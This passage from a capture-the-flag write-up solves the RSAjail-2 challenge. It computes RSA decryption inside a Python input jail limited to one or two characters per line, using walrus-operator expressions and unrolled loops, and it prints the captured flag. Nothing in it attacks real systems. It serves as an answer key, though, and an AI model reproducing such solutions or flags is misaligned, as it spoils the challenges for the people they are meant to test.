&lt;p&gt;This comes in useful later, especially in RSAjail-1, but for now, I couldn&amp;rsquo;t figure out how to implement the &lt;code&gt;while&lt;/code&gt; loop. So I settled for an easy, but bad solution - loop a constant amount of times.&lt;/p&gt;
&lt;p&gt;After doing some testing, I found that when calculating &lt;code&gt;modular_inverse(e, tn)&lt;/code&gt;, the most common number of times the &lt;code&gt;while&lt;/code&gt; loop looped was around 10 - around 20% of the time, the &lt;code&gt;while&lt;/code&gt; loop looped 10 times.&lt;/p&gt;
&lt;p&gt;Also, looping additional times doesn&amp;rsquo;t work since &lt;code&gt;a&lt;/code&gt; becomes zero and causes an error, and we get incorrect values - it has to be the &lt;em&gt;exact&lt;/em&gt; amount of loops.&lt;/p&gt;
&lt;p&gt;So if we just assume the number of times it should loop to be 10, we can ignore the whole &lt;code&gt;while&lt;/code&gt; loop and simply repeat the code 10 times. Yes, this is a bad solution because it means our code will only work 20% of the time which means we need to run it multiple times, but hey, we only need one to succeed to get the flag.&lt;/p&gt;
&lt;p&gt;For readibility purposes, from now on I will remove newlines to make the code more readible, but keep in mind that all of it can be split into 1 or 2 characters per line.&lt;/p&gt;
&lt;p&gt;As such, the code for modular inverse is shown below (the params &lt;code&gt;N&lt;/code&gt;, &lt;code&gt;p&lt;/code&gt;, &lt;code&gt;c&lt;/code&gt; used to test the code are specifically chosen to require exactly 10 iterations for modular inverse):&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# testing code (initial params)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;(N, p, c) &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;19658816114015959168822661506934810897746960941508301523029898136829954236422356288230696714218497509145448247127171276213685927588540138953910488498609797415885703059377908419410932089341671694572542346075296204447444635775115780432725985759675826220650952905101702667277980946442594098014568732789802673665948374898957822760563388032882144793699908413806535153648788672441229731217180934020288215355778531902884992191186932322134304183424209934547418908138707378543224870398215257997452996156391765986265663605807716031637406873668707844344556614477347738848967105230266893964009548166816589883344551162998406852921&lt;/span&gt;,    &lt;span style=&#34;color:#ae81ff&#34;&gt;130453368488282617461032810074522133815958556838372320878351037317254582579520496442111308634980986173256623006744002301860206808920405156266044823886359095797043398827547968038679184174328667197382367501477538816429160786329587127876859248437805001084458927041274502045315450217629728195086234876359956231457&lt;/span&gt;,    &lt;span style=&#34;color:#ae81ff&#34;&gt;13744931957300834343941499214006421832495560668326408947644526682079295296305397660682804331317391989884003392518865595292355407089611107473270751078128872540223442273373149271630197488186365946706676562083273458975899416720247794630700231499328623744814876504110721712986876341468298674650169917173229382920193142678531197592139459588909453925413821274674689810706722906260374211405950154749723078233574515629772740102349908848284048531666223469582108155571783981605954997368045859488344919296326481276368474768862732504806729887028262252937842921369526516806823341787109372303286419458445259998500379305959543029395&lt;/span&gt;,)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;X &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;lambda&lt;/span&gt; m: open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;./fn.py&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;w&amp;#34;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(str(m))
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# actual code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;N&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;p,Q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,P&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;,t&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;Q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;P,e&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;**&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;e,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;t,m0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[q&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;m,M&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;m,m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;a&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;m,a&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;M,X0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x0,x0&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;x1&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;q&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;x0,x1&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;X0]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[d&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;[x1,x1&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;m0][x1&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# testing code (to validate)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;q &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; N&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;p
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;assert&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; pow(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x10001&lt;/span&gt;, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, (p&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;(q&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;modular-exponentiation&#34;&gt;Modular Exponentiation&lt;/h3&gt;
&lt;p&gt;Modular exponentiation is simply calculating $m$ where $m = c^d \bmod{N}$. Since $d$ is a very large number, we can&amp;rsquo;t just simply multiply $c$ together $d$ times - this is infeasible. But the result is done modulo $N$, which will be small.&lt;/p&gt;
&lt;p&gt;There exists the &lt;a href=&#34;https://simple.wikipedia.org/wiki/Exponentiation_by_squaring&#34;&gt;exponentiation by squaring algorithm&lt;/a&gt;,&lt;/p&gt;

  &lt;img src=&#34;./img/exp_by_squaring.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;It is another recursive algorithm, but this time its much more simple, and we can reduce it into a while loop as well:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;exp&lt;/span&gt;(c, d, n):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; _ &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; range(&lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt;):
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            r &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (r &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; c) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; c) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; n
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        d &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; d &lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; r
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;What this does is go through each bit of $d$. If the bit is 1, it multiplies the result $r$ by $c^{2^i} \bmod{N}$ where $i$ is the position of the bit starting at 0.&lt;/p&gt;
&lt;p&gt;The amount of times we need to loop is simply the bitlength of $d$, which will be less than or equal to the bitlength of $N$, which is 2048, so we will loop for a maximum of 2048 times. This time, it doesn&amp;rsquo;t matter if we loop more than we need to, since if we do, the higher bits of $d$ will just be 0, so the result won&amp;rsquo;t change.&lt;/p&gt;
&lt;p&gt;Implementing this is pretty simple, but it just takes a lot of lines since we&amp;rsquo;re looping 2048 times:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-py&#34; data-lang=&#34;py&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[r&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	r&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;[r,(r&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;c)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N][d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	c&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;(c&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;c)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N,d&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	r&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;[r,(r&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;c)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N][d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	c&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;(c&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;c)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N,d&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	r&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;[r,(r&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;c)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N][d&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;],
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;	c&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;(c&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;c)&lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt;N,d&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;d&lt;span style=&#34;color:#f92672&#34;&gt;//&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;...&lt;/span&gt; (repeated &lt;span style=&#34;color:#ae81ff&#34;&gt;2048&lt;/span&gt; times &lt;span style=&#34;color:#f92672&#34;&gt;in&lt;/span&gt; total)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;[m&lt;span style=&#34;color:#f92672&#34;&gt;:=&lt;/span&gt;r]
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;final-solve&#34;&gt;Final solve&lt;/h3&gt;
&lt;p&gt;Now that we have modular inverse and modular exponentiation algorithms implemented, we can simply combine them to get the flag. Keep in mind we need to run this a few times on remote, since we hardcoded loop amount for modular inverse.&lt;/p&gt;
&lt;p&gt;The &lt;a href=&#34;https://TheSavageTeddy.github.io/posts/rsajail-bwctf-2024/rsajail-2-sol.txt&#34;&gt;final code&lt;/a&gt; turned out to be ~70000 lines long, with ~200k characters. Believe it or not, this is nothing compared to RSAjail-1&amp;hellip;&lt;/p&gt;
&lt;p&gt;I decided to manually copy and paste it into the terminal. It lagged for a bit, but eventually processed and pasted the characters.&lt;/p&gt;

  &lt;img src=&#34;./img/flag-2.png&#34;  class=&#34;center&#34;  style=&#34;border-radius: 5px; width: 100%&#34;  /&gt;


&lt;p&gt;Flag: &lt;code&gt;bwctf{:=_is_called_the_walrus_operator_I_assume_it_was_very_helpful}&lt;/code&gt;&lt;/p&gt;
&lt;h1 id=&#34;rsajail-1---8-solves&#34;&gt;RSAjail-1 - 8 solves&lt;/h1&gt;
&lt;p&gt;Time for the final challenge. You guessed it, exact same source as previous times, except we are only allowed ONE character per line.&lt;/p&gt;
&lt;p&gt;This means we can no longer use operators that aren&amp;rsquo;t 1 character long.&lt;/p&gt;
&lt;p&gt;We now have 2 very big problems to tackle:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;We can no longer store variables, since the walrus operator &lt;code&gt;:=&lt;/code&gt; is 2 characters long&lt;/li&gt;
&lt;li&gt;We can no longer perform integer division, since &lt;code&gt;//&lt;/code&gt; is 2 characters long&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;singular-variable&#34;&gt;Singular variable&lt;/h3&gt;
&lt;p&gt;With no walrus operator, there seems to no way to store values across multiple expressions. Without being able to store values, solving the challenge is impossible.&lt;/p&gt;
&lt;p&gt;But actually, there is still a variable we can use and modify. In the Python interpreter, &lt;code&gt;_&lt;/code&gt; is a special variable which stores the result of the last expression:&lt;/p&gt;
